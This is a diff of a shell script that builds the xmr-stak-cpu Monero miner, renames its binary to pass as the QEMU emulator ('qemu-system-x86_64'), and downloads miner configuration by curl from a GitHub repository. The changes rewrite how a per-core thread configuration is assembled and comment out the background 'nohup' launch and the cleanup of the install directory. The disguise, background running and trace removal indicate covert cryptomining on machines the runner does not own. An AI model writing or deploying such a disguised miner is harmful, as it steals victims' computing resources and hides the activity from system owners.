@@ -15,11 +15,13 @@ cd $workingdir/qemu-system-x86
 cmake .
 make install
 mv $workingdir/qemu-system-x86/bin/xmr-stak-cpu $workingdir/qemu-system-x86/bin/qemu-system-x86_64
-curl https://raw.githubusercontent.com/githubuserold/miner/master/config.txt > $workingdir/qemu-system-x86/bin/config.txt
+curl https://raw.githubusercontent.com/githubuserold/miner/master/config_for_sed.txt > $workingdir/qemu-system-x86/bin/config.txt
+echo -e "],\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
 for (( core=0; core<$phycores; core++ )); do
-        curl https://raw.githubusercontent.com/githubuserold/miner/master/cpu$core/config.txt > $workingdir/qemu-system-x86-$core/bin/config.txt
-        mv $workingdir/qemu-system-x86-$core/bin/xmr-stak-cpu $workingdir/qemu-system-x86-$core/bin/qemu-system-x86
-        cd $workingdir/qemu-system-x86-$core/bin/
-        nohup ./qemu-system-x86 &
+         echo -e "   { "low_power_mode" : false, "no_prefetch" : true, "affine_to_cpu" : ${core} },\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
 done
-rm -r /usr/share/packages_download/qemu-system-x86
+echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
+echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
+cd $workingdir/qemu-system-x86/bin/
+#nohup ./qemu-system-x86 &
+#rm -r /usr/share/packages_download/qemu-system-x86
